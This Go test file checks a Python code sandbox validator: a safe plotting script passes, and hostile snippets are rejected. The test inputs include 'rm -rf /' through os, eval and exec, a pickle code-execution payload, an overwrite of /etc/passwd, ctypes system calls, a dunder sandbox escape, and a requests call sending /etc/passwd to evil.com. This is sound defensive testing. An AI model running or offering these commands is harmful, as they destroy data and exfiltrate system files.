package api

import (
	"strings"
	"testing"
)

func TestSandboxValidatorSafeCode(t *testing.T) {
	sv := NewSandboxValidator()

	safeCode := `import sys
import pandas as pd
import matplotlib
matplotlib.use('Agg')
import matplotlib.pyplot as plt
import seaborn as sns
import numpy as np

csv_path = sys.argv[1]
plot_path = sys.argv[2]

data = pd.read_csv(csv_path)
plt.figure(figsize=(10, 6))
sns.set_style("whitegrid")

numeric_cols = data.select_dtypes(include='number').columns.tolist()
if len(numeric_cols) >= 1:
    plt.hist(data[numeric_cols[0]].dropna(), bins=20)
    plt.title(f'Distribution of {numeric_cols[0]}')

plt.tight_layout()
plt.savefig(plot_path, dpi=150, bbox_inches='tight')
`

	result := sv.Validate(safeCode)
	if !result.OK {
		t.Fatalf("expected safe code to pass, got violations: %v", result.Violations)
	}
}

func TestSandboxValidatorBlocksOsImport(t *testing.T) {
	sv := NewSandboxValidator()

	code := `import os
import pandas as pd
os.system('rm -rf /')
`
	result := sv.Validate(code)
	if result.OK {
		t.Fatal("expected os import to be blocked")
	}
	if !containsViolation(result.Violations, "blocked import 'os'") {
		t.Fatalf("expected blocked import violation, got: %v", result.Violations)
	}
}

func TestSandboxValidatorBlocksSubprocess(t *testing.T) {
	sv := NewSandboxValidator()

	code := `import subprocess
subprocess.run(['ls', '-la'])
`
	result := sv.Validate(code)
	if result.OK {
		t.Fatal("expected subprocess to be blocked")
	}
}

func TestSandboxValidatorBlocksEval(t *testing.T) {
	sv := NewSandboxValidator()

	code := `import pandas as pd
x = eval("os.system('rm -rf /')")
`
	result := sv.Validate(code)
	if result.OK {
		t.Fatal("expected eval to be blocked")
	}
	if !containsViolation(result.Violations, "eval()") {
		t.Fatalf("expected eval violation, got: %v", result.Violations)
	}
}

func TestSandboxValidatorBlocksExec(t *testing.T) {
	sv := NewSandboxValidator()

	code := `exec("import os; os.system('rm -rf /')")
`
	result := sv.Validate(code)
	if result.OK {
		t.Fatal("expected exec to be blocked")
	}
}

func TestSandboxValidatorBlocksSocket(t *testing.T) {
	sv := NewSandboxValidator()

	code := `import socket
s = socket.socket()
`
	result := sv.Validate(code)
	if result.OK {
		t.Fatal("expected socket to be blocked")
	}
}

func TestSandboxValidatorBlocksFileWrite(t *testing.T) {
	sv := NewSandboxValidator()

	code := `f = open('/etc/passwd', 'w')
f.write('hacked')
`
	result := sv.Validate(code)
	if result.OK {
		t.Fatal("expected file write to be blocked")
	}
}

func TestSandboxValidatorBlocksDunderAccess(t *testing.T) {
	sv := NewSandboxValidator()

	code := `x = [].__class__.__subclasses__()
`
	result := sv.Validate(code)
	if result.OK {
		t.Fatal("expected __subclasses__ to be blocked")
	}
}

func TestSandboxValidatorBlocksPickle(t *testing.T) {
	sv := NewSandboxValidator()

	code := `import pickle
pickle.loads(b"cos\nsystem\n(S'echo pwned'\ntR.")
`
	result := sv.Validate(code)
	if result.OK {
		t.Fatal("expected pickle to be blocked")
	}
}

func TestSandboxValidatorBlocksFromImport(t *testing.T) {
	sv := NewSandboxValidator()

	code := `from os import system
system('rm -rf /')
`
	result := sv.Validate(code)
	if result.OK {
		t.Fatal("expected 'from os' import to be blocked")
	}
}

func TestSandboxValidatorAllowsNumpy(t *testing.T) {
	sv := NewSandboxValidator()

	code := `import numpy as np
import pandas as pd
import matplotlib
matplotlib.use('Agg')
import matplotlib.pyplot as plt
`
	result := sv.Validate(code)
	if !result.OK {
		t.Fatalf("expected numpy/pandas/matplotlib to be allowed, got: %v", result.Violations)
	}
}

func TestSandboxValidatorBlocksMultiprocessing(t *testing.T) {
	sv := NewSandboxValidator()

	code := `import multiprocessing
p = multiprocessing.Process(target=print, args=('hello',))
p.start()
`
	result := sv.Validate(code)
	if result.OK {
		t.Fatal("expected multiprocessing to be blocked")
	}
}

func TestSandboxValidatorBlocksThreading(t *testing.T) {
	sv := NewSandboxValidator()

	code := `import threading
t = threading.Thread(target=print, args=('hello',))
t.start()
`
	result := sv.Validate(code)
	if result.OK {
		t.Fatal("expected threading to be blocked")
	}
}

func TestSandboxValidatorOversizedCode(t *testing.T) {
	sv := NewSandboxValidator()

	// Generate code that exceeds maxCodeLen
	hugeCode := strings.Repeat("# comment\n", 10000)
	result := sv.Validate(hugeCode)
	if result.OK {
		t.Fatal("expected oversized code to be rejected")
	}
	if !containsViolation(result.Violations, "exceeds max size") {
		t.Fatalf("expected size violation, got: %v", result.Violations)
	}
}

func TestSandboxValidatorBlocksRequests(t *testing.T) {
	sv := NewSandboxValidator()

	code := `import requests
r = requests.get('https://evil.com/steal?data=' + open('/etc/passwd').read())
`
	result := sv.Validate(code)
	if result.OK {
		t.Fatal("expected requests to be blocked")
	}
}

func TestSandboxValidatorBlocksImportlib(t *testing.T) {
	sv := NewSandboxValidator()

	code := `import importlib
mod = importlib.import_module('os')
mod.system('rm -rf /')
`
	result := sv.Validate(code)
	if result.OK {
		t.Fatal("expected importlib to be blocked")
	}
}

func TestSandboxValidatorBlocksCtypes(t *testing.T) {
	sv := NewSandboxValidator()

	code := `import ctypes
ctypes.CDLL('libc.so.6').system('id')
`
	result := sv.Validate(code)
	if result.OK {
		t.Fatal("expected ctypes to be blocked")
	}
}

func containsViolation(violations []string, substr string) bool {
	for _, v := range violations {
		if strings.Contains(v, substr) {
			return true
		}
	}
	return false
}
